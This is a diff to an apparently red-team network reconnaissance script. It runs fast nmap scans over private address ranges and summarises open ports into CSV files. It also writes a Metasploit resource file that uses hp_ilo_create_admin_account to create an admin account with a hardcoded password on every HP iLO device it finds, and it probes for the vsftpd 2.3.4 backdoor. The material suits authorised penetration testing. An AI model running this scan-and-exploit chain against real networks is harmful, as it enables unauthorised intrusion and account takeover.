@@ -1,25 +1,32 @@
-echo `date` INFO: Performing smart 192,172 and 10. scans this takes about 5-7 days
+#2020/10/20: backup old scan fils
+#2020/08/10: espaned top 40 to add apple ports 
 
-echo `date` INFO: Starting 192.
-nmap -v -T5 -oA 192 -sV --top-ports 40 --open --randomize-hosts --defeat-rst-ratelimit  192.168.0.0/16
+# backup old scan data
+export foldername=$(date +%Y%m%d)
 
-# scan 10 and 172 just  1,2,3,10,20,30,100,254 
-echo `date` INFO: Starting 172.
-nmap --max-retries 1 --min-parallelism 100 -oA 172_GUESS --top-ports 20 -T5 --open --randomize-hosts --defeat-rst-ratelimit  172.16-31.0-255.1,2,3,10,20,30,100,254
-grep open 172_GUESS.gnmap | awk '{print $2}'  | sed -r  's/(.*\..*\..*\.).*/\10\/24/'g | sort -u > 172_NETWORKS
-nmap -v -T5 -oA 172_NETWORKS -sV  --top-ports 40 --open --randomize-hosts --defeat-rst-ratelimit -iL 172_NETWORKS
+mkdir "${foldername}"
+mv *.xml "${foldername}"
+mv *.gnmap "${foldername}"
+mv *.nmap "${foldername}"
+mv *.txt  "${foldername}"
 
-echo `date` INFO: Starting 10.
-nmap --max-retries 1 --min-parallelism 100 -oA 10_GUESS --top-ports 20 -T5 --open --randomize-hosts --defeat-rst-ratelimit 10.0-255.0-255.1,2,3,10,20,30,100,254
-grep open 10_GUESS.gnmap | awk '{print $2}'  | sed -r  's/(.*\..*\..*\.).*/\10\/24/'g | sort -u > 10_NETWORKS
-nmap -v -T5 -oA 10_NETWORKS -sV  --top-ports 40 --open --randomize-hosts --defeat-rst-ratelimit  -iL 10_NETWORKS 
+
+sleep 10
+# this dos not apper to work at scale and or over time ... so feeding network list of known subnets and running nmap for each /24 range ... putting 3k ip ranges in a single nmap instance may be the issue ...
+for i in `cat SCOPE_ALL`
+do
+export varout=`echo $i|sed 's/.0\/24//g'`
+
+nmap -v -T5 -oA ${varout}_NETWORKS  -sV  -p 21-23,25,53,80-81,88,3283,110-111,113,135,139,143,179,199,443,445,465,514,548,554,587,993,995,1025-1026,1720,1723,2000,3306,3389,5060,5900,6001,8000,8080,8443,8888,10000,32768 --open --randomize-hosts --defeat-rst-ratelimit $i
+done
+
 
 echo `date` INFO: Compleated Nmap
-grep open *.gnmap | awk '{print $2}'|  sort -u | uniq -c | sort -nr > ALL_IPS_WITH_OPEN.txt
+grep open *.gnmap | awk '{print $2}'|  sort -u | uniq -c | sort -nr > ALL_IPS_WITH_OPEN.csv
 
 
 # IP,Portlist
-grep open *.gnmap | grep -E "(Host: )" | sed 's/,/ /g'| sed 's/.*Host: //g' | sed -r 's/( \(.*\)).*Ports: /,\1,/g' | sed 's/\bIgnored State.*//g' | sed 's/\/\/\///g' > IP_PORTLIST.txt
+grep open *.gnmap | grep -E "(Host: )" | sed 's/,/ /g'| sed 's/.*Host: //g' | sed -r 's/( \(.*\)).*Ports: /,\1,/g' | sed 's/\bIgnored State.*//g' | sed 's/\/\/\///g' > IP_PORTLIST.csv
 
 
 # IP,DEVICE,HOSTNAME
@@ -33,8 +40,12 @@ grep -h '\/open' *.gnmap | sed 's/Seq.*//g'| sed 's/Ignored.*//g'| sed 's/  //g'
 # subnet counts Up
 grep open *.gnmap | grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})"|sort -u|  grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})" | sort | uniq -c | sort -nr |awk '{print $1","$2}'> SUBNET_UP.csv
 
-# subnet up open ports count
+# suenet up count
 grep open *.gnmap |grep open| grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})"|sort -u|  grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})" | sort | uniq -c | sort -nr |awk '{print $1","$2}'> SUBNET_OPEN_PORTS.csv
+
+
+# ./IP_DNS_HASH_PORT.txt
+cat *NETWORKS.gnmap 192.gnmap | sort -u | grep -v Up | sed 's/,/ /g' |sed -r 's/Host: (.*) \((.*)\).*Ports: (.*)/echo "\1","\2",`echo "\3"|base64 -w 0`",\3"/ge' > ./IP_DNS_HASH_PORT.csv
 
 
 # clean /tmp
@@ -79,7 +90,7 @@ grep -E "(iLO|Nmap scan)" *.nmap | grep -B 1 iLO | grep Nmap | awk '{print $5}' 
 cat <<EOF> hp_ilo_create_admin_account.rc
 use auxiliary/admin/hp/hp_ilo_create_admin_account
 set USERNAME robertmccurdy
-set PASSWORD NoxOnBoxOnSox
+set PASSWORD ChangeMbeBro1
 set RHOSTS file:$PWD/ilo.txt
 run
 quit
@@ -205,7 +216,7 @@ grep -E "(21\/open)" *|grep -ia vsftp | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9
 nmap  --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  -p 21 --script ftp-vsftpd-backdoor -iL vsftpd_234_backdoor.txt -oA vsftpd_234_backdoor   |tee SAUSE_vsftpd_234_backdoor.txt
 grep VULN vsftpd_234_backdoor.nmap >> SAUSE_ALL.csv
 
-# add path checks for   ./metasploit/msfconsole ./changeme/changeme.py ./SAP_GW_RCE_exploit
+
 # add sysvold admin hash check
 ## Biszploit PIRA to get running
 ## eyewitness RDP and VNC ?
